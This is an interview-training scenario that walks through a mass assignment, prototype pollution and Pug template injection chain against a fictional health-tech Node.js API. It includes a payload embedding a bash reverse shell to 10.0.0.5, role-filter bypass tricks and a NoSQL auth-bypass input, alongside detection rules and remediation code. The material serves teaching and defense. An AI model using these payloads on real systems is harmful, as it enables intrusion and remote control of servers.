---
tags: [vapt, ultra-scenario, interview, expert, red-team]
difficulty: extreme
module: "Ultimate Expert Scenario Bank"
topic: "Ultra-Scenario - API 03"
---

# API Ultra 03: REST API Mass Assignment to Privilege Escalation and RCE

## 1. Executive Brief & Scenario Context
**Target:** `api.healthtech.local` (Node.js/Express with TypeORM backend)
**Context:** You are targeting an internal patient management portal. The API is entirely RESTful. You have a low-privileged account (`role: guest`). The objective is to achieve Remote Code Execution (RCE) on the underlying Linux container hosting the Node.js application.
**Primary Defenses:**
- The application uses JWT for authentication.
- Input validation is handled via custom middleware, but it relies heavily on dynamic object mapping (ORM).
- The application generates PDF reports using a templating engine (Pug/Handlebars) based on user profile data.

## 2. Architectural Diagram
```mermaid
graph LR;
    A[Attacker] -->|PUT /api/v1/profile| B(Express Router);
    B -->|req.body| C(TypeORM Object Mapper);
    C -->|Mass Assignment| D[(PostgreSQL DB)];
    D -->|Stores injected properties| D;
    B -->|GET /api/v1/report| E(Pug Template Engine);
    E -->|Merges DB object| F(AST Injection / Prototype Pollution);
    F -->|execSync()| G[RCE on Node VM];
```

## 3. The Attack Path

### Phase 1: Reconnaissance and API Fuzzing
We map the API endpoints and find the profile update route.
**Request:**
```http
PUT /api/v1/profile HTTP/1.1
Host: api.healthtech.local
Authorization: Bearer <guest_token>
Content-Type: application/json

{
  "firstName": "John",
  "lastName": "Doe"
}
```
**Response:**
```http
HTTP/1.1 200 OK
{
  "id": 102,
  "firstName": "John",
  "lastName": "Doe",
  "role": "guest",
  "profileMetadata": {}
}
```

### Phase 2: Mass Assignment (Privilege Escalation)
We notice the `role` attribute in the response. We attempt to mutate it by injecting it into our PUT request. The application takes `req.body` and passes it directly to `User.update()`.

**Exploit Physics:** Frameworks like Ruby on Rails, Spring Boot, and Node.js ORMs (Sequelize, TypeORM) often have "Mass Assignment" vulnerabilities. If the developer writes `Object.assign(userRecord, req.body)` or `repository.update(id, req.body)` without explicitly filtering the allowed fields (whitelisting), an attacker can supply undocumented parameters (like `role`, `isAdmin`, `tenant_id`) and overwrite them in the database.

**Malicious Request:**
```http
PUT /api/v1/profile HTTP/1.1
Content-Type: application/json

{
  "firstName": "John",
  "role": "admin"
}
```
**Response:**
```json
{
  "id": 102,
  "role": "admin"
}
```
*Impact:* Privilege Escalation achieved. We are now an Admin.

### Phase 3: Escalating to Prototype Pollution
As an admin, we unlock a new feature: `/api/v1/admin/generate_report`. This endpoint takes the user's `profileMetadata` JSON object from the database, deeply merges it with default template configuration options using `lodash.merge()`, and passes it to the `Pug` templating engine to render a PDF.

Because we can use Mass Assignment on the profile endpoint, we can inject arbitrary JSON structures into the `profileMetadata` column. Since Node.js uses prototype-based inheritance, we can inject a `__proto__` payload to pollute the global `Object.prototype`.

**Weaponized Mass Assignment Payload:**
```json
{
  "profileMetadata": {
    "__proto__": {
      "blockIO": "process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\"')"
    }
  }
}
```

### Phase 4: AST Injection / RCE via the Template Engine
When we trigger the PDF generation:
```http
POST /api/v1/admin/generate_report HTTP/1.1
```
**The Physics of the RCE:**
1. The backend fetches our user record from the DB, including the malicious `profileMetadata` object.
2. It calls `lodash.merge(defaultConfig, user.profileMetadata)`. Because `lodash` (older versions) does not sanitize `__proto__` keys, it recursively traverses into `Object.prototype` and sets the `blockIO` property globally across the entire Node.js VM.
3. The `Pug` templating engine compiles the template. During compilation, Pug's Abstract Syntax Tree (AST) parser evaluates configuration options. If a property like `blockIO` (or `pretty` or `compileDebug`) exists on the prototype chain, the compiler engine dynamically executes its value as JavaScript code during the AST generation phase.
4. The injected `execSync` fires, granting us a reverse shell.

## 4. Deep-Dive Interview Questions & Expert Answers

**Q1: What is the fundamental difference between Mass Assignment and Prototype Pollution?**
**Expert Answer:** Mass Assignment is a business-logic and ORM-level flaw where an attacker modifies application state (database records) by supplying unexpected fields that the backend blindly maps to an object. Prototype Pollution is a language-level flaw in JavaScript (and Python, via class pollution) where an attacker modifies the base prototype of objects (e.g., `Object.prototype`), causing *all* objects in the application's memory to inherit malicious properties. In this scenario, we chained them: we used Mass Assignment to save the Prototype Pollution payload into the database, which was later evaluated.

**Q2: How does the V8 JavaScript engine handle property lookups, and why does Prototype Pollution work?**
**Expert Answer:** When V8 accesses a property on an object (e.g., `obj.targetProp`), it first checks if the property exists directly on the object. If not, it traverses up the "prototype chain" (accessed via `__proto__` or `Object.getPrototypeOf(obj)`). It keeps looking up the chain until it hits `null`. By setting `__proto__.targetProp = "malicious"`, we modify the root `Object.prototype`. Now, any object in the application that looks for `targetProp` and doesn't explicitly have it will fall back to our inherited malicious value.

**Q3: How do you bypass Mass Assignment protections if the application explicitly removes the `role` key from the JSON payload using `delete req.body.role`?**
**Expert Answer:** If the application uses weak sanitization like `delete req.body.role`, we can bypass it using casing or array/object nesting if the backend parser is inconsistent. Alternatively, if the backend uses an ORM, we might supply relational objects. For example, `{"Role": "admin"}` (case sensitivity) or `{"role": {"id": 1}}` or exploiting HTTP Parameter Pollution by sending `role=user&role=admin`. The sanitization function might delete the first instance or fail on arrays, while the ORM accepts the last instance.

**Q4: In the context of Prototype Pollution to RCE, what is an "AST (Abstract Syntax Tree) Injection" payload?**
**Expert Answer:** Many JavaScript libraries (like Pug, Handlebars, EJS) compile templates by building an AST. The compilation process constructs dynamic JavaScript functions using `new Function()`. During this process, the compiler checks for options like `if (options.blockIO) { appendCode(options.blockIO) }`. Because we polluted the global prototype, `options.blockIO` evaluates to our malicious string. The compiler injects our string directly into the newly created function, leading to arbitrary code execution when the template is compiled.

**Q5: A developer uses `Object.freeze()` to prevent Prototype Pollution. Does this completely solve the issue?**
**Expert Answer:** `Object.freeze(Object.prototype)` is a strong defense because it prevents modification of the global prototype. However, it only protects `Object.prototype`. If an attacker can pollute `Array.prototype` or a specific class prototype (like `Function.prototype`), they can still achieve exploitation depending on the gadgets available in the application. Furthermore, `Object.freeze` can break legitimate third-party libraries that rely on extending the prototype chain.

**Q6: Why is `JSON.parse(JSON.stringify(obj))` sometimes used as a hacky mitigation for Prototype Pollution, and why is it flawed?**
**Expert Answer:** Developers use it because `JSON.parse` creates a pure object without evaluating `__proto__` keys recursively as setters. However, it's a terrible mitigation because it strips out functions, `Date` objects, `RegExp`, and `undefined` values, corrupting the application's data structures. The correct mitigation is to use `Object.create(null)` for dictionaries, which creates an object with no prototype chain, rendering it immune to pollution.

**Q7: Explain how a Mass Assignment vulnerability can lead to Account Takeover without changing passwords.**
**Expert Answer:** If the user table contains an OAuth link or SSO identifier (e.g., `github_id` or `google_sso_id`), an attacker can use Mass Assignment to update their victim's profile to map to the attacker's own `github_id`. When the attacker logs in via "Login with GitHub", the application looks up the `github_id`, finds the victim's account, and grants the attacker a session for the victim's account.

**Q8: What is a "Gadget" in the context of Prototype Pollution?**
**Expert Answer:** A gadget is a legitimate piece of code within the application or its dependencies that can be influenced by an inherited property to perform a sensitive action. For example, if a library does `let cmd = config.execPath || 'echo hello'; exec(cmd);`, the `config.execPath` lookup is the gadget. By polluting `execPath` globally, the attacker controls the command execution.

**Q9: You're testing an API, and providing `{"role":"admin"}` returns a 400 Bad Request. How might you determine if Mass Assignment is still possible on other hidden fields?**
**Expert Answer:** You can use tools like Param Miner or fuzzing lists (Arjun) to brute-force parameter names. Additionally, you can look for behavioral changes. Try injecting deeply nested JSON (e.g., `{"settings": {"beta_features": true}}`). If the API reflects this back or changes behavior without an error, it indicates the ORM is blindly accepting nested objects.

**Q10: Explain the security implications of using `req.body` directly in MongoDB Mongoose operations, such as `User.find(req.body)`.**
**Expert Answer:** Passing `req.body` directly to `find()` introduces NoSQL Injection via query operators. An attacker can pass `{"username": "admin", "password": {"$ne": null}}`. Mongoose evaluates `$ne` (not equal), and if the password is not null, the query returns true, bypassing authentication completely. This is a severe form of Mass Assignment interacting with query syntax.

## 5. Forensic Artifacts & Detection Engineering
**Identifying Prototype Pollution in Node.js logs:**
Because prototype pollution alters the state of the VM, you often see applications crash shortly after exploitation due to unexpected properties breaking standard loops (`for...in` loops iterate over inherited properties).
```bash
# Crash logs often show TypeErrors:
TypeError: Object.prototype.hasOwnProperty is not a function
```
**SIEM Rules (Splunk):**
Detecting anomalous keys in JSON payloads:
```spl
index=waf_logs
| regex _raw="\"__proto__\"|\"constructor\"|\"prototype\""
| stats count by src_ip
```

## 6. Remediation Code Snippet (Express/TypeORM)
Implementing Data Transfer Objects (DTOs) and strict whitelisting.
```typescript
import { plainToClass } from 'class-transformer';
import { validate } from 'class-validator';

class UpdateProfileDto {
  @IsString()
  firstName: string;
  @IsString()
  lastName: string;
  // Notice: 'role' and 'profileMetadata' are intentionally omitted
}

app.put('/api/v1/profile', async (req, res) => {
  // 1. Transform raw req.body into the strict DTO class
  const dto = plainToClass(UpdateProfileDto, req.body, { 
    excludeExtraneousValues: true // MITIGATION: Strips ALL undocumented properties automatically
  });

  // 2. Validate the DTO
  const errors = await validate(dto);
  if (errors.length > 0) return res.status(400).send(errors);

  // 3. Safe to update database
  await userRepository.update(req.user.id, dto);
});
```
